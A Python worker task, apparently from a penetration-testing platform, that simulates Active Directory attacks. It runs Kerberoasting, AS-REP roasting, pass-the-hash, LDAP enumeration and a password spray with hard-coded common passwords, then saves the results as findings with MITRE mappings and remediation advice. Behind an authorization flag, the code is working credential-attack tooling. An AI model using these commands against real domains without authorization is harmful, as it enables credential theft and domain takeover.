"""
Active Directory Attack Simulation
- Kerberoasting: enumerate SPNs and request TGS tickets (impacket GetUserSPNs)
- AS-REP Roasting: find accounts without pre-auth (impacket GetNPUsers)
- Pass-the-Hash: test credential reuse via CrackMapExec
- AD Enumeration: enumerate users, groups, domain info (ldapsearch / impacket)
- Finds map to MITRE ATT&CK techniques
"""
import subprocess
import json
import re
import os
import tempfile
from typing import Optional
from worker.celery_app import celery_app
from worker.tasks.base import (
    publish_output,
    update_scan_status,
    update_scan_raw_output,
    save_findings_to_db,
    update_asset_last_scanned,
)


@celery_app.task(bind=True, name="worker.tasks.ad_attacks_task.run_ad_attacks", max_retries=0)
def run_ad_attacks(
    self,
    scan_id: str,
    org_id: str,
    asset_id: Optional[str],
    target: str,
    options: dict,
):
    """
    Active Directory attack simulation.
    Options:
      - domain: AD domain name (e.g. corp.local)
      - username: domain username for authenticated enumeration
      - password: domain password
      - dc_ip: domain controller IP (defaults to target)
      - attacks: list of attacks to run ["kerberoasting", "asrep", "pth", "enum"]
      - hash: NTLM hash for pass-the-hash (format: LMHASH:NTHASH)
      - authorized: must be True
    """
    if options.get("authorized") is not True:
        update_scan_status(scan_id, "failed", "AD attacks require explicit authorization (authorized: true)")
        return

    domain = options.get("domain", "")
    username = options.get("username", "")
    password = options.get("password", "")
    dc_ip = options.get("dc_ip", target)
    nt_hash = options.get("hash", "")
    attacks = options.get("attacks", ["kerberoasting", "asrep", "enum"])

    if not domain:
        update_scan_status(scan_id, "failed", "domain is required for AD attacks")
        return

    update_scan_status(scan_id, "running")
    publish_output(scan_id, f"[ad-attacks] Target DC: {dc_ip} | Domain: {domain}")
    publish_output(scan_id, f"[ad-attacks] Attacks: {', '.join(attacks)}")

    findings = []
    raw_lines = []

    # ── AD Enumeration ──────────────────────────────────────────────────────
    if "enum" in attacks and username and password:
        publish_output(scan_id, "[ad-attacks] Enumerating domain users and groups...")
        try:
            enum_result = subprocess.run(
                [
                    "python3", "-m", "impacket.examples.GetADUsers",
                    f"{domain}/{username}:{password}",
                    "-dc-ip", dc_ip, "-all",
                ],
                capture_output=True, text=True, timeout=60
            )
            output = enum_result.stdout + enum_result.stderr
            raw_lines.append("=== AD USER ENUMERATION ===\n" + output)

            # Count users from output
            user_lines = [l for l in output.splitlines() if "@" in l or "Name" in l]
            if user_lines:
                user_count = len([l for l in output.splitlines() if domain.lower() in l.lower()])
                publish_output(scan_id, f"[ad-attacks] Found {user_count} domain users")
                if user_count > 0:
                    findings.append({
                        "title": f"Domain user enumeration successful ({user_count} users found)",
                        "description": f"Successfully enumerated {user_count} Active Directory user accounts on domain {domain}. User enumeration assists attackers in targeted credential attacks.",
                        "severity": "medium",
                        "affected_component": f"Active Directory - {domain}",
                        "affected_service": "ldap",
                        "mitre_technique": "T1087.002",
                        "remediation": "Restrict LDAP anonymous binds, enable account enumeration protection, implement decoy accounts.",
                        "references": ["https://attack.mitre.org/techniques/T1087/002/"],
                    })
        except FileNotFoundError:
            publish_output(scan_id, "[ad-attacks] impacket not installed, trying ldapsearch...")
            try:
                ldap_result = subprocess.run(
                    ["ldapsearch", "-x", "-H", f"ldap://{dc_ip}",
                     "-D", f"{username}@{domain}", "-w", password,
                     "-b", f"DC={domain.replace('.', ',DC=')}",
                     "(objectClass=user)", "sAMAccountName", "memberOf"],
                    capture_output=True, text=True, timeout=30
                )
                raw_lines.append("=== LDAP ENUMERATION ===\n" + ldap_result.stdout[:2000])
                users = re.findall(r"sAMAccountName: (\S+)", ldap_result.stdout)
                if users:
                    publish_output(scan_id, f"[ad-attacks] ldapsearch found {len(users)} users")
            except FileNotFoundError:
                publish_output(scan_id, "[ad-attacks] ldapsearch not available")
        except subprocess.TimeoutExpired:
            publish_output(scan_id, "[ad-attacks] Enumeration timed out")

    # ── Kerberoasting ───────────────────────────────────────────────────────
    if "kerberoasting" in attacks and username and password:
        publish_output(scan_id, "[ad-attacks] Running Kerberoasting attack (GetUserSPNs)...")
        try:
            kerb_result = subprocess.run(
                [
                    "python3", "-m", "impacket.examples.GetUserSPNs",
                    f"{domain}/{username}:{password}",
                    "-dc-ip", dc_ip, "-request", "-outputfile", "/tmp/kerberoast_hashes.txt",
                ],
                capture_output=True, text=True, timeout=60
            )
            output = kerb_result.stdout + kerb_result.stderr
            raw_lines.append("=== KERBEROASTING ===\n" + output)
            publish_output(scan_id, f"[ad-attacks] Kerberoasting output:\n{output[:500]}")

            # Count service accounts with SPNs
            spn_matches = re.findall(r"\$krb5tgs\$23\$", output)
            hash_count = len(spn_matches)

            if hash_count > 0:
                publish_output(scan_id, f"[ad-attacks] CRITICAL: {hash_count} Kerberos TGS tickets obtained!")
                findings.append({
                    "title": f"Kerberoasting: {hash_count} service account TGS ticket(s) extracted",
                    "description": (
                        f"Successfully extracted {hash_count} Kerberos TGS ticket(s) for service accounts with SPNs "
                        f"on domain {domain}. These tickets can be cracked offline to reveal service account "
                        f"plaintext passwords, potentially leading to privilege escalation or lateral movement."
                    ),
                    "severity": "critical",
                    "affected_component": f"Active Directory Kerberos - {domain}",
                    "affected_service": "kerberos",
                    "affected_port": 88,
                    "exploit_available": True,
                    "mitre_technique": "T1558.003",
                    "remediation": (
                        "1. Use strong passwords (25+ chars) for service accounts. "
                        "2. Migrate services to Group Managed Service Accounts (gMSA). "
                        "3. Enable AES encryption for Kerberos (disable RC4). "
                        "4. Audit and reduce unnecessary SPNs."
                    ),
                    "references": [
                        "https://attack.mitre.org/techniques/T1558/003/",
                        "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting",
                    ],
                })
            else:
                # No tickets extracted — check for SPN accounts anyway
                spn_accounts = re.findall(r"ServicePrincipalName\s+.*?(\S+@\S+)", output)
                if spn_accounts:
                    findings.append({
                        "title": f"Kerberoastable service accounts detected ({len(spn_accounts)} accounts)",
                        "description": f"Found {len(spn_accounts)} service accounts with SPNs registered: {', '.join(spn_accounts[:5])}. These accounts are vulnerable to Kerberoasting.",
                        "severity": "high",
                        "affected_component": f"Active Directory - {domain}",
                        "affected_service": "kerberos",
                        "affected_port": 88,
                        "mitre_technique": "T1558.003",
                        "remediation": "Ensure service account passwords are 25+ characters and use gMSA where possible.",
                    })
                else:
                    publish_output(scan_id, "[ad-attacks] No Kerberoastable accounts found")
        except FileNotFoundError:
            publish_output(scan_id, "[ad-attacks] impacket GetUserSPNs not available")
        except subprocess.TimeoutExpired:
            publish_output(scan_id, "[ad-attacks] Kerberoasting timed out")

    # ── AS-REP Roasting ─────────────────────────────────────────────────────
    if "asrep" in attacks:
        publish_output(scan_id, "[ad-attacks] Running AS-REP Roasting attack (GetNPUsers)...")
        try:
            # Build command — can run unauthenticated to find pre-auth disabled accounts
            asrep_cmd = [
                "python3", "-m", "impacket.examples.GetNPUsers",
                f"{domain}/",
                "-dc-ip", dc_ip, "-no-pass", "-usersfile", "/dev/stdin",
                "-format", "hashcat",
            ]
            if username and password:
                asrep_cmd = [
                    "python3", "-m", "impacket.examples.GetNPUsers",
                    f"{domain}/{username}:{password}",
                    "-dc-ip", dc_ip, "-request", "-format", "hashcat",
                ]

            asrep_result = subprocess.run(
                asrep_cmd,
                capture_output=True, text=True, timeout=60
            )
            output = asrep_result.stdout + asrep_result.stderr
            raw_lines.append("=== AS-REP ROASTING ===\n" + output)

            asrep_hashes = re.findall(r"\$krb5asrep\$23\$", output)
            if asrep_hashes:
                publish_output(scan_id, f"[ad-attacks] CRITICAL: {len(asrep_hashes)} AS-REP hash(es) captured!")
                findings.append({
                    "title": f"AS-REP Roasting: {len(asrep_hashes)} account(s) without Kerberos pre-authentication",
                    "description": (
                        f"Found {len(asrep_hashes)} user account(s) with 'Do not require Kerberos preauthentication' enabled. "
                        f"AS-REP hashes were obtained and can be cracked offline without any credentials, "
                        f"potentially revealing user account passwords."
                    ),
                    "severity": "critical",
                    "affected_component": f"Active Directory Kerberos - {domain}",
                    "affected_service": "kerberos",
                    "affected_port": 88,
                    "exploit_available": True,
                    "mitre_technique": "T1558.004",
                    "remediation": (
                        "Enable Kerberos pre-authentication for all accounts. "
                        "In AD: Account Properties → Account tab → uncheck 'Do not require Kerberos preauthentication'."
                    ),
                    "references": [
                        "https://attack.mitre.org/techniques/T1558/004/",
                    ],
                })
            else:
                publish_output(scan_id, "[ad-attacks] No AS-REP vulnerable accounts found")
        except FileNotFoundError:
            publish_output(scan_id, "[ad-attacks] impacket GetNPUsers not available")
        except subprocess.TimeoutExpired:
            publish_output(scan_id, "[ad-attacks] AS-REP Roasting timed out")

    # ── Pass-the-Hash ───────────────────────────────────────────────────────
    if "pth" in attacks and nt_hash:
        publish_output(scan_id, "[ad-attacks] Running Pass-the-Hash check (CrackMapExec)...")
        try:
            pth_result = subprocess.run(
                [
                    "crackmapexec", "smb", dc_ip,
                    "-u", username or "Administrator",
                    "-H", nt_hash,
                    "--shares",
                ],
                capture_output=True, text=True, timeout=30
            )
            output = pth_result.stdout + pth_result.stderr
            raw_lines.append("=== PASS-THE-HASH ===\n" + output)

            if "[+]" in output and "Pwn3d!" in output:
                publish_output(scan_id, "[ad-attacks] CRITICAL: Pass-the-Hash succeeded! Domain Admin access confirmed!")
                findings.append({
                    "title": "Pass-the-Hash authentication succeeded against domain controller",
                    "description": (
                        f"NTLM hash authentication was successful against {dc_ip} ({domain}). "
                        f"The provided hash grants administrative access to the domain controller, "
                        f"indicating NTLM hash reuse is possible. This represents complete domain compromise."
                    ),
                    "severity": "critical",
                    "affected_component": f"Domain Controller - {dc_ip}",
                    "affected_service": "smb",
                    "affected_port": 445,
                    "exploit_available": True,
                    "mitre_technique": "T1550.002",
                    "remediation": (
                        "1. Enable Protected Users Security Group for privileged accounts. "
                        "2. Enable Credential Guard on Windows 10/Server 2016+. "
                        "3. Disable NTLM authentication where possible (use Kerberos). "
                        "4. Implement Local Administrator Password Solution (LAPS). "
                        "5. Tier admin accounts — domain admins should never log into workstations."
                    ),
                    "references": [
                        "https://attack.mitre.org/techniques/T1550/002/",
                    ],
                })
            elif "[+]" in output:
                publish_output(scan_id, "[ad-attacks] Pass-the-Hash: authentication succeeded (non-admin)")
                findings.append({
                    "title": "Pass-the-Hash authentication succeeded (standard user access)",
                    "description": f"NTLM hash authentication was successful against {dc_ip}. Standard user access confirmed via hash reuse.",
                    "severity": "high",
                    "affected_component": f"Domain Controller - {dc_ip}",
                    "affected_service": "smb",
                    "affected_port": 445,
                    "exploit_available": True,
                    "mitre_technique": "T1550.002",
                    "remediation": "Enable Credential Guard, disable NTLM, implement LAPS.",
                })
            else:
                publish_output(scan_id, "[ad-attacks] Pass-the-Hash: authentication failed")
        except FileNotFoundError:
            publish_output(scan_id, "[ad-attacks] crackmapexec not available, trying impacket smbclient...")
            try:
                pth_result = subprocess.run(
                    ["python3", "-m", "impacket.examples.smbclient",
                     f"{domain}/{username}", "-hashes", f":{nt_hash.split(':')[-1]}",
                     "-target-ip", dc_ip],
                    input="exit\n", capture_output=True, text=True, timeout=20
                )
                if "Sharename" in pth_result.stdout:
                    publish_output(scan_id, "[ad-attacks] impacket PtH: SMB authentication succeeded")
            except Exception:
                pass
        except subprocess.TimeoutExpired:
            publish_output(scan_id, "[ad-attacks] Pass-the-Hash timed out")

    # ── Password Spray ──────────────────────────────────────────────────────
    if "spray" in attacks and username:
        spray_passwords = ["Password1!", "Welcome1!", "Summer2024!", "Winter2024!", "Company123!"]
        publish_output(scan_id, f"[ad-attacks] Running password spray with {len(spray_passwords)} common passwords...")
        try:
            for pwd in spray_passwords:
                spray_result = subprocess.run(
                    ["crackmapexec", "smb", dc_ip, "-u", username, "-p", pwd, "--no-bruteforce"],
                    capture_output=True, text=True, timeout=15
                )
                if "[+]" in spray_result.stdout:
                    publish_output(scan_id, f"[ad-attacks] CRITICAL: Password spray succeeded! {username}:{pwd}")
                    findings.append({
                        "title": f"Weak/common password: account '{username}' uses predictable password",
                        "description": f"Password spray attack succeeded for account {username} with password '{pwd}'. Common/seasonal passwords allow unauthorized domain access.",
                        "severity": "critical",
                        "affected_component": f"AD Account - {username}@{domain}",
                        "affected_service": "kerberos",
                        "exploit_available": True,
                        "mitre_technique": "T1110.003",
                        "remediation": "Enforce password complexity policy, implement account lockout, use MFA.",
                    })
                    break
        except FileNotFoundError:
            publish_output(scan_id, "[ad-attacks] crackmapexec not available for spray")

    update_scan_raw_output(scan_id, "\n".join(raw_lines))
    count = save_findings_to_db(scan_id, org_id, asset_id, findings)
    update_asset_last_scanned(asset_id)
    publish_output(scan_id, f"[ad-attacks] Complete. {count} findings saved.")
    update_scan_status(scan_id, "completed")
